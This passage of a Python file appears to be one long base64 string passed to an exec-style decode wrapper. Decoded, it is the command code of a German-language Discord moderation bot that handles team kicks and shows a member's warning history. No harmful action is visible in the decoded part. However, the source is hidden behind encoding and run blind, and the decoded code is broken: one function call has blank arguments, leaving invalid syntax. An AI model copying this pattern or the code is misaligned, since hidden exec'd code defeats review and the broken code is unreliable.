249cmVhc29uLA0KICAgICAgICBhZG1pbj1pbnRlcmFjdGlvbi51c2VyLm1lbnRpb24NCiAgICApDQoNCiAgICBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoIuKchSBEZXIgVGVhbWtpY2sgd3VyZGUgZXJmb2xncmVpY2ggZHVyY2hnZWbDvGhydCEiLCBlcGhlbWVyYWw9VHJ1ZSkNCiAgICBhd2FpdCBpbnRlcmFjdGlvbi5jaGFubmVsLnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgYXdhaXQgc2VuZF9kbShtZW1iZXIsICJUZWFta2ljayIsIGYiRHUgd3VyZGVzdCBhdXMgZGVtIFRlYW0gZW50ZmVybnQuXG5cbioqR3J1bmQ6Kioge3JlYXNvbn0iLCBpbnRlcmFjdGlvbikNCg0KICAgIHVwZGF0ZV9oaXN0b3J5KA0KICAgICAgICBtZW1iZXIsDQogICAgICAgICAgICAgICAgICAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICApDQogICAgDQpAYm90LnRyZWUuY29tbWFuZChuYW1lPSJ0ZWFtbWVtYmVyaGlzdG9yeSIsIGRlc2NyaXB0aW9uPSJaZWlndCBkaWUgSGlzdG9yaWUgZWluZXMgVGVhbW1pdGdsaWVkcy4iKQ0KQGFwcF9jb21tYW5kcy5kZXNjcmliZShtZW1iZXI9IkRhcyBNaXRnbGllZCwgZGVzc2VuIEhpc3RvcmllIGFuZ2V6ZWlndCB3ZXJkZW4gc29sbC4iKQ0KYXN5bmMgZGVmIHRlYW1tZW1iZXJoaXN0b3J5KGludGVyYWN0aW9uOiBkaXNjb3JkLkludGVyYWN0aW9uLCBtZW1iZXI6IGRpc2NvcmQuTWVtYmVyKToNCiAgICBpZiBub3QgaXNfZmVhdHVyZV9lbmFibGVkKCJoaXN0b3J5Iik6DQogICAgICAgIHJldHVybiBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoIuKdjCBEaWVzZSBGdW5rdGlvbiBpc3QgZGVha3RpdmllcnQuIiwgZXBoZW1lcmFsPVRydWUpDQogICAgaWYgbm90IGFueShyb2xlLmlkIGluIEFETUlOX1JPTEVfSURTIGZvciByb2xlIGluIGludGVyYWN0aW9uLnVzZXIucm9sZXMpOg0KICAgICAgICByZXR1cm4gYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKCLinYwgRHUgaGFzdCBrZWluZSBCZXJlY2h0aWd1bmcgZsO8ciBkaWVzZW4gQmVmZWhsLiIsIGVwaGVtZXJhbD1UcnVlKQ0KDQogICAgdXNlcl9pZCA9IHN0cihtZW1iZXIuaWQpDQogICAgaWYgdXNlcl9pZCBub3QgaW4gaGlzdG9yeToNCiAgICAgICAgcmV0dXJuIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZSgi4pqg77iPIEtlaW5lIEhpc3RvcmllIGbDvHIgZGllc2VzIE1pdGdsaWVkIGdlZnVuZGVuLiIsIGVwaGVtZXJhbD1UcnVlKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgY3VycmVudF90aW1lID0gZGF0ZXRpbWUubm93KCkudGltZXN0YW1wKCkNCiAgICBmb3Igd2FybiBpbiBoaXN0b3J5W3VzZXJfaWRdLmdldCgid2FybnMiLCBbXSk6DQogICAgICAgIGlmICJleHBpcmVzIiBpbiB3YXJuOg0KICAgICAgICAgICAgZXhwaXJlcyA9IGZsb2F0KHdhcm5bImV4cGlyZXMiXSkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICB3YXJuWyJleHBpcmVkIl0gPSBleHBpcmVzIDwgY3VycmVudF90aW1lDQogICAgc2F2ZV9oaXN0b3J5KGhpc3RvcnkpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgDQogICAgdXNlcl9oaXN0b3J5ID0gaGlzdG9yeVt1c2VyX2lkXQ0KICAgIGxhc3RfdXByYW5rID0gdXNlcl9oaXN0b3J5LmdldCgibGFzdF91cHJhbmsiLCAiTi9BIikNCiAgICB0b3RhbF93YXJucyA9IGxlbih1c2VyX2hpc3RvcnkuZ2V0KCJ3YXJucyIsIFtdKSkNCiAgICBhY3RpdmVfd2FybnMgPSBzdW0oMSBmb3Igd2FybiBpbiB1c2VyX2hpc3RvcnkuZ2V0KCJ3YXJucyIsIFtdKSBpZiBub3Qgd2Fybi5nZXQoImV4cGlyZWQiLCBGYWxzZSkpDQogICAgbGFzdF93YXJuX2V4cGlyZWQgPSAiTi9BIg0KICAgIGV4cGlyZWRfd2FybnMgPSBbdyBmb3IgdyBpbiB1c2VyX2hpc3RvcnkuZ2V0KCJ3YXJucyIsIFtdKSBpZiB3LmdldCgiZXhwaXJlZCIsIEZhbHNlKV0NCiAgICBpZiBleHBpcmVkX3dhcm5zOg0KICAgICAgICBsYXN0X2V4cGlyZSA9IG1heChmbG9hdCh3WyJleHBpcmVzIl0pIGZvciB3IGluIGV4cGlyZWRfd2FybnMpDQogICAgICAgIGxhc3Rfd2Fybl9leHBpcmVkID0gZGF0ZXRpbWUuZnJvbXRpbWVzdGFtcChsYXN0X2V4cGlyZSkuc3RyZnRpbWUoIiVkLiVtLiVZICVIOiVNOiVTIikNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICBjdXJyZW50X3JhbmsgPSBuZXh0KChyb2xlLm5hbWUgZm9yIHJvbGUgaW4gbWVtYmVyLnJvbGVzIGlmIHJvbGUuaWQgaW4gVEVBTV9ST0xFX0lEUyksICJOL0EiKQ0KDQogICAgam9pbmVkX2F0ID0gdXNlcl9oaXN0b3J5LmdldCgiam9pbmVkX2F0IiwgIk4vQSIpDQoNCiAgICAgICAgICAgICAgICAgICAgIA0KICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCgNCiAgICAgICAgdGl0bGU9ZiLwn5OcIEhpc3RvcmllIHZvbiB7bWVtYmVyLmRpc3BsYXlfbmFtZX0iLA0KICAgICAgICBjb2xvcj1kaXNjb3JkLkNvbG9yLmJsdWUoKQ0KICAgICkNCiAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0iSW0gVGVhbSBzZWl0IiwgdmFsdWU9am9pbmVkX2F0LCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9IkFrdHVlbGxlciBSYW5nIiwgdmFsdWU9Y3VycmVudF9yYW5rLCBpbmxpbmU9RmFsc2UpDQogICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9IkxldHp0ZXIgVXByYW5rIiwgdmFsdWU9bGFzdF91cHJhbmssIGlubGluZT1GYWxzZSkNCiAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0iR2VzYW10ZSBXYXJudW5nZW4iLCB2YWx1ZT1zdHIodG90YWxfd2FybnMpLCBpbmxpbmU9VHJ1ZSkNCiAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0iQWt0aXZlIFdhcm51bmdlbiIsIHZhbHVlPXN0cihhY3RpdmVfd2FybnMpLCBpbmxpbmU9VHJ1ZSkNCiAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0iTGV0enRlIGFiZ2VsYXVmZW5lIFdhcm51bmciLCB2YWx1ZT1sYXN0X3dhcm5fZXhwaXJlZCwgaW5saW5lPUZhbHNlKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgIHdhcm5fZGV0YWlscyA9IFtdDQogICAgZm9yIGksIHdhcm4gaW4gZW51bWVyYXRlKHVzZXJfaGlzdG9yeS5nZXQoIndhcm5zIiwgW10pLCAxKToNCiAgICAgICAgc3RhdHVzID0gIvCflLQgQWt0aXYiIGlmIG5vdCB3YXJuLmdldCgiZXhwaXJlZCIsIEZhbHNlKSBlbHNlICLwn5+iIEFiZ2VsYXVmZW4iDQogICAgICAgIGlzc3VlZCA9IHdhcm4uZ2V0KCJpc3N1ZWQiLCAiVW5iZWthbm50IikNCiAgICAgICAgZXhwaXJlcyA9IGRhdGV0aW1lLmZyb210aW1lc3RhbXAoZmxvYXQod2FyblsiZXhwaXJlcyJdKSkuc3RyZnRpbWUoIiVkLiVtLiVZICVIOiVNOiVTIikgaWYgImV4cGlyZXMiIGluIHdhcm4gZWxzZSAiVW5iZWthbm50Ig0KICAgICAgICByZWFzb24gPSB3YXJuLmdldCgicmVhc29uIiwgIktlaW4gR3J1bmQgYW5nZWdlYmVuIikNCiAgICAgICAgd2Fybl9kZXRhaWxzLmFwcGVuZChmIntpfS4ge3N0YXR1c30gfCB7aXNzdWVkfSBiaXMge2V4cGlyZXN9XG5HcnVuZDoge3JlYXNvbn1cbiIpDQoNCiAgICBoaXN0b3J5X3RleHQgPSAiXG4iLmpvaW4odXNlcl9oaXN0b3J5LmdldCgiZnVsbF9oaXN0b3J5IiwgWyJLZWluZSBFaW50csOkZ2UiXSkpDQogICAgd2Fybl90ZXh0ID0gIlxuIi5qb2luKHdhcm5fZGV0YWlscykgaWYgd2Fybl9kZXRhaWxzIGVsc2UgIktlaW5lIFdhcm51bmdlbiINCiAgICBmdWxsX3RleHQgPSBmIj09PSBWT0xMU1TDhE5ESUdFIEhJU1RPUklFID09PVxue2hpc3RvcnlfdGV4dH1cblxuPT09IFdBUk5VTkdFTiA9PT1cbnt3YXJuX3RleHR9Ig0KDQogICAgICAgICAgICAgICAgICAgICAgDQogICAgaGlzdG9yeV9maWxlID0gZGlzY29yZC5GaWxlKGlvLlN0cmluZ0lPKGZ1bGxfdGV4dCksIGZpbGVuYW1lPWYie21lbWJlci5kaXNwbGF5X25hbWV9X2hpc3RvcnkudHh0IikNCg0KICAgIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZShlbWJlZD1lbWJlZCwgZmlsZT1oaXN0b3J5X2ZpbGUsIGVwaGVtZXJhbD1UcnVlKQ0KDQpib3QucnVuKFRPS0VOKQ0K'))